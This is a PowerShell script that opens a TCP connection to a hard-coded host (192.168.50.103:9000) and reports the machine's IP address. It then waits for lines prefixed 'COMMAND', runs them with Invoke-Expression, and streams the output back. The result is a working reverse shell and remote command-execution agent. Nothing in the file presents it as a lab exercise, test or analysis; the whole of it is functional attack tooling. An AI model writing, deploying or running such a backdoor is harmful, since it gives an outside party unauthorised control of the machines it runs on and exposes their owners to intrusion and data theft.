$ip = "192.168.50.103"
$port = 9000
$IPAddress = (Test-Connection -ComputerName $Env:ComputerName -Count 1).IPV4Address.IPAddressToString

$message = "Hello $IPAddress"

function Send-SystemStatsStreamed {
    param (
        [System.IO.StreamWriter]$writer
    )

    $commands = @(
        "test"
    )

    foreach ($cmd in $commands) {
        $writer.WriteLine("--- Running: $cmd ---")
        try {
            $result = Invoke-Expression $cmd | Out-String
            $result.Split("`n") | ForEach-Object {
                $writer.WriteLine($_.TrimEnd())
                $writer.Flush()
            }
        } catch {
            $writer.WriteLine("Error running $cmd : $_")
            $writer.Flush()
        }
    }

    $writer.WriteLine("==END_OF_STATS==")
    $writer.Flush()
}

function Handle-Command {
    Write-Host "Args count: $($args.Length)"
    Write-Host "First arg: '$($args[0])'"

    $input = $args[0]
    $writer = $args[1]

    $cmd = $input.Trim() -replace "^COMMAND\s+", ""
    Write-Host "Executing COMMAND: $cmd"

    try {
        $result = Invoke-Expression $cmd | Out-String
        $result.Split("`n") | ForEach-Object {
            $writer.WriteLine("COMMANDR " + $_.TrimEnd())
            $writer.Flush()
        }
    } catch {
        $writer.WriteLine("COMMANDR Error: $_")
        $writer.Flush()
    }
}

try {
    $client = New-Object System.Net.Sockets.TcpClient
    $client.Connect($ip, $port)

    if ($client.Connected) {
        $stream = $client.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream, [System.Text.Encoding]::UTF8)
        $reader = New-Object System.IO.StreamReader($stream, [System.Text.Encoding]::UTF8)
        $writer.AutoFlush = $true

        $writer.WriteLine($message)
        Write-Host "Sent: $message"

        while ($true) {
            $line = $reader.ReadLine()
            if ($null -eq $line) { break }

            Write-Host "Received: $line"

            if ($line -eq "getstats") {
                Write-Host "Streaming system stats..."
                Send-SystemStatsStreamed -writer $writer

                # Now enter a loop to wait for commands until "LCONNECTION" is received
                while ($true) {
                    $commandLine = $reader.ReadLine()
                    if ($null -eq $commandLine) {
                        Write-Host "Connection closed by remote."
                        break
                    }
                    Write-Host "Received command: $commandLine"

                    if ($commandLine -eq "LCONNECTION") {
                        Write-Host "Received LCONNECTION, closing connection."
                        break
                    }
                    elseif ($commandLine -like "COMMAND *") {
                        Write-Host "Calling Handle-Command with: '$commandLine'"
                        Handle-Command "$commandLine" $writer
                    }
                }
                break  # exit main while loop after LCONNECTION closes the session
            }
            elseif ($line -like "COMMAND *") {
                Handle-Command "$line" $writer
            }
        }

        $writer.Close()
        $reader.Close()
        $stream.Close()
        $client.Close()
    } else {
        Write-Host "Connection failed."
    }
} catch {
    Write-Host "Error: $_"
}
